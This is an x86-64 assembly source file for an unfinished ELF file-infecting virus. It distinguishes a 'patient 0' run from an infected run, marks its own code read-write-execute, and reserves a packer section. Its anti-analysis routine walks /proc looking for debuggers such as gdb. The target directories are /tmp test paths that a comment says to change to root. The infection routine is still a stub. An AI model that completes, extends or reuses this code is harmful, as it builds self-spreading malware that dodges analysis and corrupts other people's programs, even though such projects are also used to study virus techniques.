%include "main.inc"

; function parameters are always (rdi, rsi, rdx, rcx, r8, r9) in this specific
; order (make sense with syscall)

global _start

; ------------------------ this section exists for packer to work ; to find after excecute segment offset ----------------
section .packer_sec
    db `haha`, 0

section .text

params:                                ; filled for infected binaries
    test_param dq 0x0

_start:

main:
    ; mprotect start to end labels to be RWX
    mov rax, SYS_MPROTECT
    lea rdi, [rel _start]
    lea rsi, [rel _end]
    sub rsi, rdi
    mov rdx, PROT_READ | PROT_WRITE | PROT_EXEC
    syscall

	; branch for infected file running or running patient 0
    cmp qword [test_param], 0
    je mother

infected:
    ; TODO: if run as infected, run the same routine as mother
    ; but modify evasion routine and jump to entry address afterward
    jmp exit_ok

mother:

	; evasion routine
    mov rdi, 0
    call iterate_directory_moded
    jmp exit_ok
    ; open proc dir
    

; Iterate directories with 2 modes.
;
; Input:
;     RDI   = mode. 0 for evasion mode, 1 for infection mode 
; Output:
;     RAX   = status. For evasion mode, 1 will be returned if early close is required Else 0.
;                     For infection mode, non zero will be returned if failure. 
iterate_directory_moded:
    push rcx
    push r8
    push r9
    cmp rdi, 0
    je .evasion_mode
    jne .infect_mode

.evasion_mode:
    mov rax, SYS_OPEN
    lea rdi, [rel proc_dir]
    mov rsi, O_RDONLY | O_DIRECTORY
    xor rdx, rdx
    syscall

    ; save this fd
    mov r9, rax

    test rax, rax
    js exit_err

.file_loop_start_evasion:
    sub rsp, DIRENT_BUF_SZ
    mov rdi, r9
    mov rsi, rsp
    mov rdx, DIRENT_BUF_SZ
    mov rax, SYS_GETDENTS64
    syscall

    test rax, rax
    js exit_err
    jz .file_loop_end_evasion
    
    mov rcx, 0

.dirent_read_loop_start_evasion: 
    cmp rcx, rax
    jge .dirent_read_loop_end_evasion

    ; print stuff
    lea rdi, [rsp + rcx + dirent.d_name]
    call write_string_nl

    ; TODO: allocate /proc/[dirent.d_name]/status in stack
    ; open and read. If error, continue

    ; find needles in haystack. If found, set rax to 1 and
    ; return

.dirent_read_loop_cont_evasion:
    movzx r8, word [rsp + rcx + dirent.d_reclen]
    add rcx, r8
    jmp .dirent_read_loop_start_evasion
    

    
.dirent_read_loop_end_evasion: 
    add rsp, DIRENT_BUF_SZ
    jmp .file_loop_start_evasion


.file_loop_end_evasion:
    add rsp, DIRENT_BUF_SZ



.infect_mode:
    jmp exit_err

.ret:
    pop r9
    pop r8
    pop rcx
    ret



    ; lea r8, [rel _end] ; end addr
    ; lea r9, [rel _start]; start addr
    ; sub r8, r9 ; r8 = end - start


    xor rdi, rdi                        ; exit code 0
    mov rax, SYS_EXIT                   ; exit
    syscall

error_exit:
    mov rdi, 1                          ; exit code 1
    mov rax, SYS_EXIT                   ; exit
    syscall

; -----------------------------------utils--------------------------------
exit_err:
    mov rdi, 1                          ; exit code 1
    mov rax, SYS_EXIT                   ; exit
    syscall

exit_ok:
    mov rdi, 0                          ; exit code 0
    mov rax, SYS_EXIT                   ; exit
    syscall

strlen:
    xor rax, rax

.loop:
    cmp byte[rdi + rax], 0
    je .done

    inc rax
    jmp .loop

.done:
    ret

streq:
.loop:
    mov al, [rdi]
    cmp al, [rsi]
    jne .no
    inc rdi
    inc rsi
    test al, al
    jne .loop
    xor eax, eax
    ret

.no:
    mov eax, 1
    ret

write_string_nl:
    push rdi
    push rax
    push rcx

    call strlen ; rax = string length

    ; write(fd=stdout, buf=string, count=len)
    mov rdx, rax
    mov rax, SYS_WRITE
    mov rsi, rdi
    mov rdi, 1
    syscall

    ; write newline
    mov rax, SYS_WRITE
    mov rdi, 1
    lea rsi, [rel newline]
    mov rdx, 1
    syscall

	pop rcx
    pop rax
    pop rdi
    ret

; -----------------------------------data-in-code-------------------------------

dirent_buf times DIRENT_BUF_SZ db 0x0

newline db `\n`

; TODO: change this to root 
root_dirs db `/tmp/test`, 0, `/tmp/test2`,0,0
excl_dir db `.`, 0, `..`, 0, 0

proc_dir db `/proc`,0
proc_status db `status`, 0
evade_proc_n db `\tcat\n`, 0, `\tgdb\n`, 0, 0

_end:
